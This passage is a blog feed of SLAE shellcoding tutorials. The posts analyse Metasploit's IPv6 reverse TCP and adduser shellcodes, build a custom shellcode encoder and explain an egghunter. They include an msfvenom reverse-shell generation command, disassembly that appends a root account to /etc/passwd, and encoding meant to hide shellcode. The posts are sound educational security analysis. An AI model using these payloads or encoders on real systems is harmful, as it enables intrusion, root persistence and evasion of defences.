+            <description>Most of us have worked a lot with IPv4 payloads and shellcodes. Let us see how different is Metasploit IPv6 Shellcode and how does it work. In this post, we will make use of libemu to conduct out our analysis on the IPV6 Reverse TCP shellcode. We will also use strace to aid our analysis. Throughout the analysis, our agenda is to figure out the key differences between an IPv4 and IPv6 shellcode.</description>
+            <content type="html"><![CDATA[<p><a href="../images/2018-02-23-art-of-shellcoding-metasploit-ipv6-reverse-tcp-shellcode-analysis-back-door-300x199.jpg"><img src="../images/thumbnails/2018-02-23-art-of-shellcoding-metasploit-ipv6-reverse-tcp-shellcode-analysis-back-door-300x199.jpg" alt="" /></a></p>
+
+<p>Most of us have worked a lot with IPv4 payloads and shellcodes. Let us
+see how different is Metasploit IPv6 Shellcode and how does it work. In
+this post, we will make use of libemu to conduct out our analysis on the
+IPV6 Reverse TCP shellcode. We will also use strace to aid our analysis.
+Throughout the analysis, our agenda is to figure out the key differences
+between an IPv4 and IPv6 shellcode. We will try to figure out the
+differences between the two. So let&rsquo;s get started. Let&rsquo;s Generate the
+shellcode with msfvenom using the following command in conjunction with
+sctests from libemu:</p>
+
+<blockquote>
+<p>msfvenom -p linux/x86/shell/reverse_ipv6_tcp LHOST=::1 LPORT=4444 -f
+raw | /opt/libemu/bin/sctest -vvv -Ss 10000</p>
+</blockquote>
+
+<p>We will have the following output:</p>
+
+<p><a href="../images/2018-02-23-art-of-shellcoding-metasploit-ipv6-reverse-tcp-shellcode-analysis-Screenshot%2B2018-02-10%2B01.41.55.png"><img src="../images/thumbnails/2018-02-23-art-of-shellcoding-metasploit-ipv6-reverse-tcp-shellcode-analysis-Screenshot%2B2018-02-10%2B01.41.55.png" alt="" /></a></p>
+
+<p>We can see that we have two systems calls in this shellcode. The first
+is the socket setup and the next one is connect. We can use libemu with
+the -G option to create a dot based graphics file which simplifies
+things for us. The dot graph file can then be converted into a PNG image
+using the dot utility in linux. Let us see the obtained PNG as follows:</p>
+
+<p><a href="../images/2018-02-23-art-of-shellcoding-metasploit-ipv6-reverse-tcp-shellcode-analysis-ipv6.png"><img src="../images/thumbnails/2018-02-23-art-of-shellcoding-metasploit-ipv6-reverse-tcp-shellcode-analysis-ipv6.png" alt="" /></a></p>
+
+<p>Let&rsquo;s analyze the above flow diagram. In the very first block, We start
+by clearing out EBX register which means that now EBX contains 0. We
+push this value onto the stack. Next, we increment EBX register making
+its value as 1 and push it again to the stack. Next, we push 10 onto the
+stack. Hence the stack (from the top) becomes a structure like {10,1,0}.
+In the next step, we simply point this structure to ECX. Hence ECX now
+contains the address of the structure we created above. The structure
+consists of very similar values as in the first screenshot. This means 0
+points to the protocol(0), 1 to the type and 10 as the domain, i.e.,
+AF_INET6(IPv6). Type 1 denotes SOCK_STREAM. Next, we simply perform a
+push-pop to EAX with the syscall number 0x66 that denotes socketcall.</p>
+
+<p>Hence, we have EAX: 0x66 , EBX: 0x1, ECX:{10,1,0} and we issue the
+interrupt. The arrangement will issue a socketcall of type SYS_SOCKET
+with the domain as 10 (IPV6) and type as SOCK_STREAM.</p>
+
+<p>The result of the above syscall will be stored to EAX. Hence, we perform
+an XCHG operation to move the value to ESI. Next, we issue a CWD
+(Convert to DWORD) which will extend EAX to EDX. Hence clearing out
+values in EDX as well.</p>
+
+<p>Next, we will setup connect system call. For the connect system call to
+work, we require 0x66 in EAX register denoting the socketcall, 0x3 in
+EBX register and ECX pointing to the stack structure.</p>
+
+<p>Talking about the structure, we will require the following structure
+pointed to by the ECX register( I found the following structure using
+strace): </p>
+
+<blockquote>
+<p>{sa_family=AF_INET6, sin6_port=htons(4444), inet_pton(AF_INET6,
+&ldquo;::1&rdquo;, &amp;sin6_addr), sin6_flowinfo=0, sin6_scope_id=0}</p>
+</blockquote>
+
+<p>Hence, the first part is to set up the inet_pton structure and then
+embed it as a part of the full structure. We start by setting up the
+values for sin6_addr to 0 using push dword 0 and similarly setting up
+::1 address and AF_INET6 as 0x5c11000a. Setting up this structure, We
+move the stack pointer to ECX and begin setting up rest of the remaining
+values.</p>
+
+<p>Next three push operations will make the new structure as {Result from
+the previous system call, Current Pointer in ECX, 28}. Hence, we push
+ECX after pushing 28(length) and ESI register, since it holds the result
+sockfd from the previous call. Next, we just need to point this current
+structure in ECX, Increment EBX to 3(Connect syscall), 0x66(socketcall)
+in EAX and issue the interrupt.</p>
+
+<p>The last part of the image is nothing but sys_read system call. The
+read system call should be called in the following manner:</p>
+
+<blockquote>
+<p>ssize_t read(int fd, void *buf, size_t count);</p>
+</blockquote>
+
+<p>Therefore, in the shellcode, we have EAX with 0x3(sys_read), EBX with
+file descriptor by moving it to EBX from ESI. Next, We move 0xc to DH
+which will set EDX with a huge value for the length.</p>
+
+<p>Note: ECX register remains unchanged, and we issue the interrupt.</p>
+
+<p>Throughout this exercise, we saw that there isn&rsquo;t much difference
+between IPv4 and IPv6 reverse TCP shellcodes. The only changes are the
+domain value and address of the host. The logic of the connection
+remains the same. Nothing fancy!!</p>
+
+<p><span
+style="background: 0px 0px; border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;">This
+blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</span></p>
+
+<p><span
+style="background: 0px 0px; border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span></p>
+
+<p><span id="goog_1275964878"></span><span id="goog_1275964879"></span></p>
+
+<p><span
+style="background: 0px 0px; border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;">Student-ID:
+SLAE-1080</span></p>
+
+<p><span
+style="background: 0px 0px; border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;"><br />
+</span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of ShellCoding: Metasploit Add User Payload Analysis</title>
+            <link>/posts/2018/02/art-of-shellcoding-metasploit-add-user-payload-analysis/</link>
+            <pubDate>Sat, 10 Feb 2018 01:15:00 +0530</pubDate>
+            
+            <guid>/posts/2018/02/art-of-shellcoding-metasploit-add-user-payload-analysis/</guid>
+            <description>In the previous post, we saw how we can encode the shellcode with our customized encoding schemes. In this post, we will see how some of the famous shellcodes from the metasploit framework work. We will analyze three different shellcodes using different techniques and tools in this mini shellcode analysis series. In this post, we will examine linux/x86/adduser shellcode with ndisasm and will see how the stuff works behind the scene.</description>
+            <content type="html"><![CDATA[<p><a href="../images/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-logo_metasploit_rapid7.png"><img src="../images/thumbnails/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-logo_metasploit_rapid7.png" alt="" /></a></p>
+
+<p>In the previous post, we saw how we can encode the shellcode with our
+customized encoding schemes. In this post, we will see how some of the
+famous shellcodes from the metasploit framework work. We will analyze
+three different shellcodes using different techniques and tools in this
+mini shellcode analysis series. In this post, we will examine
+linux/x86/adduser shellcode with ndisasm and will see how the stuff
+works behind the scene.</p>
+
+<p>The adduser shellcode adds a specified user to the linux system. Let&rsquo;s
+see how we can create this shellcode using msfvenom:</p>
+
+<p><a href="../images/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-06%2B21.46.39.png"><img src="../images/thumbnails/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-06%2B21.46.39.png" alt="" /></a></p>
+
+<p>    Let&rsquo;s copy the shellcode from the &lsquo;shellcode&rsquo; file and analyze it
+using ndisasm as follows:</p>
+
+<p><a href="../images/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-06%2B21.46.10.png"><img src="../images/thumbnails/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-06%2B21.46.10.png" alt="" /></a></p>
+
+<p>We have the complete disassembly of the code here:</p>
+
+<p>Having a look at the disassembly, we will see that we have four primary
+system calls here which are setreuid, open, write and exit system call.
+I know things may not be clear here and you might be wondering how
+exactly i can say this? Let&rsquo;s break the code down and see it ourselves:</p>
+
+<p><span
+style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">**<br />
+**</span></p>
+
+<p><span
+style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><strong>xor
+ecx,ecx<br />
+mov ebx,ecx<br />
+push byte +0x46<br />
+pop eax<br />
+int 0x80</strong></span></p>
+
+<p><span
+style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace; font-size: xx-small;">**<br />
+**</span></p>
+
+<p>Clearing out ECX, we move the obtained 0 to EBX. Next, we put 0x46 in
+EAX using a PUSH-POP operation. The 0x46 in hexadecimal corresponds to
+70 in decimal and denotes setreuid() syscall. The setreuid syscall takes
+two parameters, i.e., <code>int setreuid(uid_t</code><span
+style="background-color: #ccccff; font-family: monospace; font-size: 14.6667px;"> </span><em>ruid</em><code>, uid_t</code><span
+style="background-color: #ccccff; font-family: monospace; font-size: 14.6667px;"> </span><em>euid</em><code>);</code>
+The parameters ruid and euid are real and effective user ids. The
+setreuid set the real and effective user ids of the current process to
+the values provided in setreuid. Since we have 0 in EBX and 0 in ECX,
+this means that setreuid will be called as setreuid(0,0) and 0
+corresponds to the user id root.</p>
+
+<p><span
+style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><strong>push
+byte +0x5<br />
+pop eax<br />
+xor ecx,ecx<br />
+push ecx<br />
+push dword 0x64777373<br />
+push dword 0x61702f2f<br />
+push dword 0x6374652f<br />
+mov ebx,esp<br />
+inc ecx<br />
+mov ch,0x4<br />
+int 0x80</strong></span></p>
+
+<p>The above piece of code puts 0x5 in EAX which is nothing but
+sys_open<span
+style="background-color: orange; text-align: justify;">(int open(const
+char *pathname, int flags);)</span><span
+style="text-align: justify;"> </span> system call. Next, we clear out
+ECX and push it to the stack. The value to be pushed into the stack is 0
+since we cleared out ECX using XOR operation. The next three
+instructions put the string /etc//passwd on the stack, and since they
+are at the top of the stack, we move ESP to EBX. Next, we increment ECX
+to 1 and then move 0x4 to CH register which is HIGH bytes of CX
+register. We already have a value in CL which is 1. Therefore, this
+operation will make the value in ECX as 0x401 which is nothing but a
+bitmask representing a combination of  O_WRONLY | O_APPEND flags.
+Using this combination of registers, we will be opening /etc/passwd file
+in write-only append mode. Upon successful execution, it will return the
+descriptor for the file. The next two lines exchange the descriptor with
+EBX register and call<br />
+<span
+style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">**<br />
+xchg eax,ebx<br />
+call dword 0x4e**</span></p>
+
+<p>Here is the trick of this shellcode. Since we issue a call instruction,
+the data after the call instruction is pushed onto the stack. Confused?
+After the call instruction we have:</p>
+
+<pre><code>0000002B  6E                outsb
+0000002C  6970756E3A417A    imul esi,[eax+0x75],dword 0x7a413a6e
+00000033  627242            bound esi,[edx+0x42]
+00000036  334B30            xor ecx,[ebx+0x30]
+00000039  7072              jo 0xad
+0000003B  52                push edx
+0000003C  41                inc ecx
+0000003D  59                pop ecx
+0000003E  3A30              cmp dh,[eax]
+00000040  3A30              cmp dh,[eax]
+00000042  3A3A              cmp bh,[edx]
+00000044  2F                das
+00000045  3A2F              cmp ch,[edi]
+00000047  62696E            bound ebp,[ecx+0x6e]
+0000004A  2F                das
+0000004B  7368              jnc 0xb5
+0000004D  0A598B            or bl,[ecx-0x75]
+</code></pre>
+
+<p>These may look like instructions, but they are not. In fact, this is the
+data. Let&rsquo;s analyze it as follows:</p>
+
+<p>From 6E to 68(Second Last Line, 0A is line feed):</p>
+
+<p>6e 69 70 75 6e 3a 41 7a 62 72 42 33 4b 30 70 72 52 41 59 3a 30 3a 30 3a
+3a 2f 3a 2f 62 69 6e 2f 73 68</p>
+
+<p>Transforms to:<br />
+<span style="background-color: yellow;"><span
+style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><strong>nipun:AzbrB3K0prRAY:0:0::/:/bin/sh</strong></span></span></p>
+
+<p>The above string is the data to be written into the file we opened using
+SYS_OPEN<span style="background-color: white;"> </span>call. Coming
+back to the call instruction it will land us at the at the byte 59 (Last
+line) after 0A:</p>
+
+<p><a href="../images/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-10%2B00.17.27.png"><img src="../images/thumbnails/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-10%2B00.17.27.png" alt="" /></a> </p>
+
+<p>We can see the value in EIP which points to byte 59. Let&rsquo;s reconfirm it:</p>
+
+<p><a href="../images/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-10%2B00.19.18.png"><img src="../images/thumbnails/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-10%2B00.19.18.png" alt="" /></a></p>
+
+<p>Now, the POP ECX command will put the data to be written into the ECX
+register, and the next instruction puts the length of this data onto the
+EDX register. Rest of the code is straightforward it pushes the value
+0x4 on the stack and pops it to EAX register. This is nothing but the
+WRITE system call. This means we have the following arrangement of
+registers:</p>
+
+<p><span
+style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><strong>EAX:
+0x4 Write System Call<br />
+EBX: File Descriptor (From the XCHG Operation)<br />
+ECX: The data itself<br />
+EDX: Length of data</strong></span></p>
+
+<p><a href="../images/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-10%2B00.35.25.png"><img src="../images/thumbnails/2018-02-10-art-of-shellcoding-metasploit-add-user-payload-analysis-Screenshot%2B2018-02-10%2B00.35.25.png" alt="" /></a></p>
+
+<p>We simply issue the interrupt, and the data gets written to the
+/etc/passwd file. Next, we just issue an exit system call by putting 0x1
+to EAX using a PUSH-POP operation</p>
+
+<p><strong>Analysis:</strong></p>
+
+<p>The shellcode appends the specified user credentials to /etc/passwd file
+and exits.</p>
+
+<p><span
+style="background-position: 0px 0px; border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;">This
+blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</span></p>
+
+<p><span
+style="background-position: 0px 0px; border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span></p>
+
+<p><span
+style="background-position: 0px 0px; border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;">Student-ID:
+SLAE-1080</span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of Shellcoding: The MultiEncoder Shellcode</title>
+            <link>/posts/2018/02/art-of-shellcoding-the-multiencoder-shellcode/</link>
+            <pubDate>Tue, 06 Feb 2018 17:10:00 +0530</pubDate>
+            
+            <guid>/posts/2018/02/art-of-shellcoding-the-multiencoder-shellcode/</guid>
+            <description>Dear Readers, Hope you all are doing great. In the previous post, we saw how we could create a shellcode for egghunting and ended up creating one of the shortest egghunter shellcode with just under 12 bytes. In this post, we will only work on encoding the shellcode by combining 3 different encoding schemes. The shellcode we will choose to demo our custom encoder will be a simple /bin/sh shell invoking shellcode.</description>
+            <content type="html"><![CDATA[<p><a href="../images/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-shellcode-encoder.png"><img src="../images/thumbnails/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-shellcode-encoder.png" alt="" /></a></p>
+
+<p>Dear Readers, Hope you all are doing great. In the previous post, we saw
+how we could create a shellcode for egghunting and ended up creating one
+of the shortest egghunter shellcode with just under 12 bytes. In this
+post,  we will only work on encoding the shellcode by combining 3
+different encoding schemes. The shellcode we will choose to demo our
+custom encoder will be a simple /bin/sh shell invoking shellcode. You
+can download a copy of this simple shellcode from
+<a href="https://github.com/nipunjaswal/slae-exam/blob/master/ASSGN-4/execve-stack.nasm" target="_blank">here</a>. 
+We will write a simple python script which will encode the bytes of the
+/bin/sh shellcode with our custom encoding scheme. Here is the source of
+the python script:</p>
+
+<p>Running the python program, we can see that we have encoded shellcode
+which we can use in decoder stub:</p>
+
+<p><a href="../images/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.12.12.png"><img src="../images/thumbnails/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.12.12.png" alt="" /></a></p>
+
+<p>As we can see this is a pretty straightforward Encoder which encodes
+each byte of the /bin/sh shellcode by XORing it with 0xAA, then XORing
+it again with 0xCF, then performing a NOT operation on the byte and
+finally doing a ROT shift of 131 on the byte. Therefore, to create a
+decoder stub for the shellcode, we will write a simple assembly program
+as follows:</p>
+
+<p>We can see that it&rsquo;s a pretty straightforward decoder stub. The first
+operation it performs is to simply remove the ROT shift of 131 by
+subtracting the byte with 131. Next, it performs a NOT operation and
+then finally do a double XOR operation with 0xCF and 0xAA one after the
+other. After completing these four activities for all the bytes, it
+directly jumps to the Shellcode. Extracting the bytes of Shellcode from
+this program, we can just create a C program and test its functionality
+as follows:</p>
+
+<p>Compiling the C code, we can execute the program and see if works or
+not:</p>
+
+<p><a href="../images/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.03.15.png"><img src="../images/thumbnails/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.03.15.png" alt="" /></a></p>
+
+<p>Works!! Great. We can see that the length of the shellcode is 76 bytes.
+Let&rsquo;s run this program in GDB and analyze the step by step decoding
+process as follows:</p>
+
+<p><a href="../images/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.18.23.png"><img src="../images/thumbnails/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.18.23.png" alt="" /></a></p>
+
+<p>We can see that our original /bin/sh encoded shellcode of 25 bytes is
+visible in the above screenshot. We are currently doing a ROT shift of
+131 by subtracting it from the first byte of our encoded shellcode which
+is 0x2e. This will change the byte 0x2e to 0xab:</p>
+
+<p><a href="../images/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.18.56.png"><img src="../images/thumbnails/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.18.56.png" alt="" /></a></p>
+
+<p>Similarly, the next operation is to perform a NOT of the byte which will
+transform the byte 0xab to 0x54:</p>
+
+<p><a href="../images/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.19.10.png"><img src="../images/thumbnails/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.19.10.png" alt="" /></a></p>
+
+<p>Next are two XOR operations, the first with 0xCF which will change the
+byte to 0x9b and the one with 0xaa will convert the byte to 0x31 which
+is the original byte of our /bin/sh execve shellcode:</p>
+
+<p><a href="../images/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.19.37.png"><img src="../images/thumbnails/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.19.37.png" alt="" /></a></p>
+
+<p>Similarly, all the above operations will happen for rest of the 24 bytes
+of the shellcode, and before jumping to the decoded shellcode, we will
+have the following shell code:</p>
+
+<p><a href="../images/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.23.26.png"><img src="../images/thumbnails/2018-02-06-art-of-shellcoding-the-multiencoder-shellcode-Screenshot%2B2018-02-06%2B01.23.26.png" alt="" /></a></p>
+
+<p>This is nothing but the original shellcode of /bin/sh program as we can
+see in the python encoder Yeepee! We have successfully decoded the
+entire shellcode with ease. We can name this encoder as RNX2 encoder as
+XOR-XOR-NOT-ROT operations are followed for encoding and ROT-NOT-XOR-XOR
+for decoding.</p>
+
+<p>All the files for this tutorial/ exercise are availiable
+at: <a href="https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-4" target="_blank">https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-4</a></p>
+
+<p><span
+style="background-color: white; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px;">This
+blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</span></p>
+
+<p><span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;"></span></p>
+
+<p><span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span></p>
+
+<p><span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;">
+</span><span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;"></span></p>
+
+<p><span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;">Student-ID:
+SLAE-1080</span></p>
+
+<p><span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; transition: all 0.3s ease; vertical-align: baseline;">
+</span></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Art of Shellcoding: Cracking Eggs with EggHunters</title>
+            <link>/posts/2018/01/art-of-shellcoding-cracking-eggs-with-egghunters/</link>
+            <pubDate>Tue, 16 Jan 2018 08:00:00 +0530</pubDate>
+            
+            <guid>/posts/2018/01/art-of-shellcoding-cracking-eggs-with-egghunters/</guid>
+            <description>Dear Readers, thank you for your overwhelming response to the previous post on reverse TCP shellcode. Last time, we wrote one of the smallest reverse TCP shellcodes of all time. This post advances onto an interesting concept called the Egg Hunter Shellcode. So, what is an egg hunter shellcode? For those interested in exploit development, they often come across a problem of limited space for the shellcode to execute. I remember the first exploit i wrote was a POC for SamSpade tool.</description>
+            <content type="html"><![CDATA[<p><a href="../images/2018-01-16-art-of-shellcoding-cracking-eggs-with-egghunters-easter-egg-hunt-ideas-you-havent-thought-about.jpeg"><img src="../images/thumbnails/2018-01-16-art-of-shellcoding-cracking-eggs-with-egghunters-easter-egg-hunt-ideas-you-havent-thought-about.jpeg" alt="" /></a></p>
+
+<p>Dear Readers, thank you for your overwhelming response to the previous
+post on reverse TCP shellcode. Last time, we wrote one of the smallest
+reverse TCP shellcodes of all time. This post advances onto an
+interesting concept called the Egg Hunter Shellcode. So, what is an egg
+hunter shellcode? For those interested in exploit development, they
+often come across a problem of limited space for the shellcode to
+execute. I remember the first exploit i wrote was a POC for
+<a href="https://www.exploit-db.com/exploits/38687/" target="_blank">SamSpade</a> tool. Yeap, the
+good old samspade which allows us to fingerprint the targets. I wanted
+to exploit the same, but space was limited. It was only 7-8 bytes of
+space, and no shellcode would fit into it. The same sort of problems is
+addressed by egg hunter shellcodes. This means small shellcodes would
+allow jumping to the more substantial shellcodes in memory. However, 7-8
+bytes is still something which is always tough.</p>
+
+<p><span style="color: red;">Note: I created one of the smallest egghunter
+shellcode after i wrote this post and is published on
+exploit-db.com: <a href="https://www.exploit-db.com/exploits/43910/" target="_blank">https://www.exploit-db.com/exploits/43910/</a></span></p>
+
+<p>The beauty of an egghunter shellcode lies in the fact that you don&rsquo;t
+need to hardcode any addresses or calculate an exact offset to make a
+jump while executing the staged payload. In fact, its just a small
+program which will scan through the entire address space of the program
+and find a specific keyword, once the keyword is found, it directly
+jumps right next to it(start of the shellcode). We call this keyword an
+&ldquo;egg.&rdquo; So let&rsquo;s get started with our egghunter shellcode as follows:</p>
+
+<p>As we can see that the first line of code is the for the page alignment
+in case, invalid regions of memory are encountered. Next, we just
+increment the value of ECX and validate this address using sigaction
+syscall, denoted by 0x43. We now issue the interrupt and compare the
+value returned by sigaction syscall in EAX to 0xf2 which is the lower
+bytes of EFAULT (Denotes Bad Addresses/ Invalid Addresses). This means
+that on every EFAULT, page alignment will happen since the Zero Flag
+gets set by the CMP instruction. However, if the memory region is valid,
+the jump to page alignment is not taken, and our EGG value which is
+0x50905090 is moved to EAX register while our valid address is
+transferred to EDI from ECX. But why did we move from ECX to EDI? This
+is because we will be using  SCASD instruction which compares the string
+held at the address pointed to by the EDI register with the contents of
+EAX register [This is precisely where our egghunter hits the WORD
+version of the EGG if it finds it for the first time]. However, if it
+doesn&rsquo;t hit the egg[Denoted by ZF flag],  it jumps to increment the
+address and perform the same steps of the next valid memory region.</p>
+
+<p>In cases where the first SCASD instruction sets the ZF flag, another
+SCASD instruction is followed, but why?</p>
+
+<p>This is because we have an 8-byte version of the EGG which means when
+the EGG 0x50905090 is compared, a correct match will occur on the
+following sequence of bytes which is
+&ldquo;\x90\x50\x90\x50\x90\x50\x90\x50&rdquo;. We use the 8-byte version of
+the EGG to provide a real uniqueness to the EGG. Coming back to why we
+used SCASD again, we used it because on the very first SCASD
+instruction, the SCASD instruction along with the comparison also
+increments the value of EDI by four and the next four bytes at EDI are
+nothing but the next half of the 8-byte EGG. The memory address in ECX
+completing both the SCASD operations successfully will yet again
+increment EDI by four which will bring us to the start of the shellcode.
+We merely have to jump to this address to execute our shellcode
+successfully.</p>
+
+<p>Let&rsquo;s see some action as follows:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-16-art-of-shellcoding-cracking-eggs-with-egghunters-Screenshot%2B2018-01-16%2B01.48.33.png"><img src="../images/thumbnails/2018-01-16-art-of-shellcoding-cracking-eggs-with-egghunters-Screenshot%2B2018-01-16%2B01.48.33.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Just Before Jumping to EDI</td>
+</tr>
+</tbody>
+</table>
+
+<p>As we can see from the above screenshot, right before jumping to the
+address pointed by EDI, Zero Flag was set (Due to SCASD and it also
+increments EDI by 4) and we are led to the shellcode by EDI. Examining
+the address in EDI, we have the following output:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-16-art-of-shellcoding-cracking-eggs-with-egghunters-Screenshot%2B2018-01-16%2B01.51.29.png"><img src="../images/thumbnails/2018-01-16-art-of-shellcoding-cracking-eggs-with-egghunters-Screenshot%2B2018-01-16%2B01.51.29.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">116 Bytes starting at the address pointed to by EDI</td>
+</tr>
+</tbody>
+</table>
+
+<p>This is nothing but our shellcode ;) which will get executed and provide
+us with a beautiful looking bind shell when connected.</p>
+
+<p>Let&rsquo;s see the program in action as follows:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-16-art-of-shellcoding-cracking-eggs-with-egghunters-Screenshot%2B2018-01-16%2B01.19.36.png"><img src="../images/thumbnails/2018-01-16-art-of-shellcoding-cracking-eggs-with-egghunters-Screenshot%2B2018-01-16%2B01.19.36.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Egg Hunter in Action</td>
+</tr>
+</tbody>
+</table>
+
+<p>The Final code for the demo implementation of the shellcode is as
+follows:</p>
+
+<p><span
+style="background-color: white; color: #222222; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; text-align: left;">Files
+for this tutorial can be found at:</span></p>
+
+<p><span
+style="color: #222222; font-family: &quot;open sans&quot; , sans-serif;"><span
+style="font-size: 15px;"><a href="https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-3" target="_blank">https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-3</a></span></span></p>
+
+<p><span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;">This
+blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</span><br />
+<span
+style="background: 0px 0px rgb(255 , 255 , 255); border: 0px; color: red; font-family: &quot;open sans&quot; , sans-serif; font-size: 15px; margin: 0px; outline: 0px; padding: 0px; text-align: left; transition: all 0.3s ease; vertical-align: baseline;"></span><span
